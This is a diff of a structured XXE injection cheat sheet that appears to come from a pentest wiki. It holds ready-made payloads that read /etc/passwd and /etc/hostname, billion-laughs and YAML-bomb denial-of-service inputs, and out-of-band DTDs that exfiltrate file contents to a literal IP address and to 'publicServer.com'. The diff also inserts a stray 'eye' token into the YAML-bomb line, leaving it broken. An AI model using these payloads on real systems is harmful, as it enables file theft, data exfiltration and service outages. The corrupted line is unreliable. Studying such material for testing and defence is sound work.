@@ -13,8 +13,36 @@
     "sections": [
         {
             "heading": "Summary",
-            "type": "paragraph",
-            "content": "{% hint style=\"info\" %}\nXML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.\n{% endhint %}\nDetection:\n``markup\n# Content type \"application/json\" or \"application/x-www-form-urlencoded\" to \"applcation/xml\".\n# File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.\n# If svg allowed in picture upload, you can inject xml in svgs.\n# If the web app offers RSS feeds, add your milicious code into the RSS.\n# Fuzz for /soap api, some applications still running soap apis\n# If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse\n`\nCheck:\n`\n\n]>\n&test;\n`\nIf works, then:\n`\n\n]>\n&test;\n``"
+            "type": "hint",
+            "variant": "info",
+            "content": "XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access."
+        },
+        {
+            "heading": "Detection",
+            "type": "code_block",
+            "content": [
+                "# Content type \"application/json\" or \"application/x-www-form-urlencoded\" to \"application/xml\".",
+                "# File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.",
+                "# If svg allowed in picture upload, you can inject xml in svgs.",
+                "# If the web app offers RSS feeds, add your malicious code into the RSS.",
+                "# Fuzz for /soap api, some applications still running soap apis",
+                "# If the target web app allows for SSO integration, you can inject your malicious xml code in the SAML request/response"
+            ]
+        },
+        {
+            "heading": "Check",
+            "type": "code_block",
+            "content": [
+                "<?xml version=\"1.0\"?>",
+                "<!DOCTYPE a [<!ENTITY test \"THIS IS A STRING!\">]>",
+                "<methodCall><methodName>&test;</methodName></methodCall>",
+                "",
+                "# If works, then try:",
+                "",
+                "<?xml version=\"1.0\"?>",
+                "<!DOCTYPE a[<!ENTITY test SYSTEM \"file:///etc/passwd\">]>",
+                "<methodCall><methodName>&test;</methodName></methodCall>"
+            ]
         },
         {
             "heading": "Tools",
@@ -89,7 +117,6 @@
                 "<foo>&xxe;</foo>",
                 "",
                 "# Deny Of Service - Billion Laugh Attack",
-                "",
                 "<!DOCTYPE data [",
                 "<!ENTITY a0 \"dos\" >",
                 "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">",
@@ -100,9 +127,8 @@
                 "<data>&a4;</data>",
                 "",
                 "# Yaml attack",
-                "",
                 "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]",
-                "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",
+                "b: &b [*a,*a,*a,*a,*a,*a,*a,*a eye,*a]",
                 "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",
                 "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",
                 "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",
@@ -112,7 +138,6 @@
                 "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]",
                 "",
                 "# XXE OOB Attack (Yunusov, 2013)",
-                "",
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
                 "<!DOCTYPE data SYSTEM \"http://publicServer.com/parameterEntity_oob.dtd\">",
                 "<data>&send;</data>",
@@ -123,7 +148,6 @@
                 "%all;",
                 "",
                 "# XXE OOB with DTD and PHP filter",
-                "",
                 "<?xml version=\"1.0\" ?>",
                 "<!DOCTYPE r [",
                 "<!ELEMENT r ANY >",
@@ -138,11 +162,9 @@
                 "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>\">",
                 "",
                 "# XXE Inside SOAP",
-                "",
                 "<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]></foo></soap:Body>",
                 "",
                 "# XXE PoC",
-                "",
                 "<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM \"file:///etc/passwd\"> ]><x>&xxe_test;</x>",
                 "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM \"file:///etc/passwd\"> ]><x>&xxe_test;</x>",
                 "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM \"file:///etc/passwd\">]><foo>&xxe_test;</foo>",
@@ -156,47 +178,34 @@
                 "<?xml version=\"1.0\" encdoing=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]><svg width=\"512px\" height=\"512px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"14\" x=\"0\" y=\"16\">&xxe;</text></svg>  ",
                 "",
                 "# XXE Hidden Attack",
-                "",
                 "- Xinclude",
-                "",
                 "Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.",
                 "Set the value of the productId parameter to:",
                 "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
                 "",
                 "- File uploads:",
-                "",
                 "Create a local SVG image with the following content:",
                 "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
                 "Post a comment on a blog post, and upload this image as an avatar.",
-                "When you view your comment, you should see the contents of the /etc/hostname file in your image. Then use the \"Submit solution\" but"
+                "When you view your comment, you should see the contents of the /etc/hostname file in your image."
             ]
         },
         {
             "heading": "Mindmap",
-            "type": "paragraph",
-            "content": ")\n{% embed url=\"https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities\" %}"
+            "type": "image",
+            "src": "/gitbook/assets/image (26).png",
+            "caption": "XXE Attack Mindmap"
+        },
+        {
+            "type": "link",
+            "title": "Exploiting Advanced XXE Vulnerabilities",
+            "url": "https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities"
         }
     ],
     "images": [
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
